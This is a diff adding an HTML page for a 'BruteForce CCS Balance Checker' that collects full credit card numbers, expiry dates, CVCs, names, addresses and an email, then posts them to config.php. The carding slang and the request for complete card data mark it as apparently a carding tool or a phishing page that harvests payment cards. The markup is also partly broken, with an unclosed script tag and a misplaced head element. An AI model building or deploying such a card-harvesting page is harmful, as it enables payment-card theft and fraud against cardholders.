@@ -1,0 +1,231 @@
+
+ <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=(1.0)">
+    <link rel="stylesheet" href="style.css">
+    <title>BruteForcechecker</title>
+    <link rel="icon" href="icon.jpg" type="image/x-icon">
+
+    <div style="height: 2px; background-color: #4a0f1c; margin-bottom: 20px;"></div>
+    <script>
+
+   
+
+
+
+
+
+
+    <nav>
+            <ul class="navbar">
+                <li><a href="index.php">Home</a></li>
+                <li><a href="about.php">About</a></li>
+                <div class="welcome-container">
+                  <button onclick="signOut()">Sign Out</button>
+              </div>
+          
+              <script>
+                  function signOut() {
+                      // Optionally, clear any session data or perform logout logic here
+                      alert('You have signed out.');
+                      window.location.href = 'login.html'; // Redirect to login page
+                  }
+              </script>
+            </ul>
+        </nav>
+
+
+        <h1 class="header">Welcome to BruteForce CCS Balance Checker</h1>
+
+ 
+       
+
+    <div class="container">
+   
+    <div class="card">
+   
+ 
+        <img class="=blood" src="img/logo.png" >
+     
+   
+   
+
+
+
+        
+    
+    
+   
+    
+
+
+ 
+
+    
+    </div><br>
+
+    
+
+</div>
+    
+   
+    
+<body>
+
+
+
+
+<form method="post" action="config.php">
+
+
+
+           <div>
+            <h1 >Enter The Credit Card Info Below</h1>
+     <hr><br>
+
+        <div>
+        <label  class="label" for="Country">Select Country:</label>
+    
+        </div><br>
+
+      <div>
+       <input  name="country" type="radio"  value="USA">
+       <img class="country-option"  src="img/flag/usa.png"> USA   
+               </div><br>
+             
+                
+    <div>    
+         <input  name="country" type="radio" value="UK">
+         <img class="country-option"  src="img/flag/uk.jpg"> UK
+
+                   </div><br>
+
+             <div>
+             <input name="country" type="radio" value="Canada">
+             <img class="country-option"  src="img/flag/canada.jpg"> CANADA
+
+     </div><br>
+ <div>
+          <input name="country" type="radio"  value="EUROPE">
+          <img  class="country-option"  src="img/flag/aurope.jpg"> EUROPE
+                            </div><br>
+
+
+  <div>              
+      <input class="label" name="country" type="radio"  value="AUSTRALIA">
+      <img  class="country-option"   src="img/flag/australia.png"> AUSTRALIA
+                     </div><br>  
+
+<div>
+
+
+
+        
+
+
+
+     <hr><br>
+
+<div>
+<select class="qqq" name="cardtype">
+<option value="MAESTRO DEBIT">MAESTRO DEBIT</option>
+<option value="DINERS CLUB">DINERS CLUB CREDIT</option>
+<option value="VISA">VISA CREDIT</option>
+<option value="MASTER">MASTER CREDIT</option>
+<option value="DISCOVER">DISCOVER CREDIT</option>
+<option value="AMERICAN EXPRESS(AMEX)">AMERICAN EXPRESS(AMEX) CREDIT</option>
+<option value="VISA DEBIT">VISA DEBIT</option>
+<option value="MASTER DEBIT">MASTER DEBIT</option>
+<option value="DISCOVER DEBIT">DISCOVER DEBIT</option>
+<option value="AMERICAN EXPRESS DEBIT">AMERICAN EXPRESS DEBIT</option>
+<option value="V PAY DEBIT">V PAY DEBIT</option>
+</select>
+Card Type
+<hr><br>
+     <div>
+    
+ 
+
+    <input class="label2" name="CCN" type="tel" inputmode="numeric" maxlenght="19" placeholder="xxxx xxxx xxxx" Required> 
+           Enter Your CCN
+
+            </div><br>
+
+            <div>
+
+                       <input class="label2" name="Expiry" type="tel" inputmode="numeric" maxlenght="7" placeholder="MM / YY" Required>
+                      Expiry
+
+                       <div><br>
+                       <input class="label2" name="cvc" type="tel" inputmode="numeric" maxlenght="4" placeholder="CVC" Required>
+                        CVC
+
+                           </div>
+
+                    <hr><br>
+
+
+
+                 </div>
+
+
+                 </div>
+                  <label  name="CardName" for="CardName">Card Name:</label>
+                   <input  name="CardName" type="text"  placeholder="Name On The Card (Optional)" Optional>
+
+
+                  <label  name="Address" for="Address">Address:</label>
+                   <input  name="Address" type="text"  placeholder="Address (Optional)" Optional>
+
+
+                   <label for="zip">Zip Code:</label>
+        <input  name="zip" type="text" id="zip" name="zip" placeholder="Zip Code (Optional)" pattern="\d{5}">
+        
+                      <hr><br>
+
+
+       <div>
+     <input inputmode name="Email" type="email" autocomplete="off"placeholder="Email for result receiving">
+     Email                      
+ </div><br>
+
+
+
+
+
+<button type="submit" class="btn" onclick="openPopup()">submit</button>
+<div class="popup" id="popup">
+<img src="tick.png">
+<h2>Thank you!</h2>
+<p>Please fill all the field correctly......The Bot would Automatically send the result of the balance to your email provided</p>
+ <button type="button"  onclick="closePopup()">ok</button>
+ 
+</div>
+<head>
+<script>
+  let popup = document.getElementById("popup");
+
+  function openPopup(){
+
+    popup.classList.add("open-popup");
+    
+  }
+    function closePopup(){
+    popup.classList.remove("open-popup");
+    }
+
+</script>
+
+</html>
+
+<footer>
+  <div class="footer-content">
+      <p>&copy; <span id="year"></span> Space Team. All rights reserved.</p>
+
+      <script>
+        // Get the current year
+        document.getElementById("year").textContent = new Date().getFullYear();
+
+    </script>
